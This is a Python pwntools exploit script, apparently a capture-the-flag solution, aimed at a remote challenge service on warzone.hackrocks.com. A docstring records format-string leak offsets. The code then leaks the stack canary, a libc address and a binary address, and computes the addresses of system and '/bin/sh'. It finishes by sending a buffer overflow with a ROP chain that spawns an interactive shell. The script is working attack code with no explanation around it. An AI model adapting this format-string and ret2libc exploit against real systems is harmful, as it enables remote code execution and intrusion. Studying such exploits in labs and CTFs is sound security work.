from pwn import *

"""
iterate 51
[!] Payload %51$lx has 70% possibilities of libc leak: 7f7ded48109b
[+] overflow offset at 312
[+] canary payload %49$lx
[+] libc leaking payload
['%21$lx', '%22$lx', '%51$lx']
[!] Binary payload %43$lx with response 561adfe882c5 and offset 0x12c5
[!] Binary payload %46$lx with response 55eb4fe74280 and offset 0x1280
[!] Binary payload %47$lx with response 55e53ebae090 and offset 0x1090
[!] Binary payload %50$lx with response 55b657d07280 and offset 0x1280
[!] Binary payload %55$lx with response 556a2ded0175 and offset 0x1175
[!] Binary payload %58$lx with response 55986c987090 and offset 0x1090
[!] Binary payload %72$lx with response 563eeaebe090 and offset 0x1090
[!] Binary payload %75$lx with response 55a3a1a820ba and offset 0x10ba
[!] Binary payload %99$lx with response 55670d1a3040 and offset 0x1040
[!] Binary payload %109$lx with response 55d5b3a7e090 and offset 0x1090
"""
start_main_off = 0x2409b
binsh_off = 0x180519
system_off = 0x449c0
bin_gadget = 0x12db
bin_offset = 0x1280
ovlo = 312

p = remote("warzone.hackrocks.com", 7772)

p.recvuntil(b'see?:')
p.sendline(b'%49$lx.%51$lx.%46$lx')

addr = p.recvuntil(b'?nice one')
addr = addr.decode('utf-8')
addr = addr.split(' ')
parse = addr[2].split('.')
#print(addr)

canary = int(str('0x'+parse[0]), 16)

libc_leak = int(str('0x'+parse[1]), 16)
libc_base = libc_leak - start_main_off
system = libc_base + system_off
shell = libc_base + binsh_off

binary = int(str('0x'+parse[2]), 16) - bin_offset
poprdi = binary + bin_gadget


log.success("canary: "+hex(canary))
log.success("libc leak: "+hex(libc_leak))
log.success("libc base: "+hex(libc_base))
log.success("system: "+hex(system))
log.success("shell: "+hex(shell))

log.info("binary base: "+hex(binary))
log.info("binary gadget: "+hex(poprdi))

payload = b'a'*ovlo
payload += p64(canary)
payload += b'JUNKJUNK' # rbp
payload += p64(poprdi)
payload += p64(shell)
payload += p64(system)

p.sendline(payload)
p.interactive()

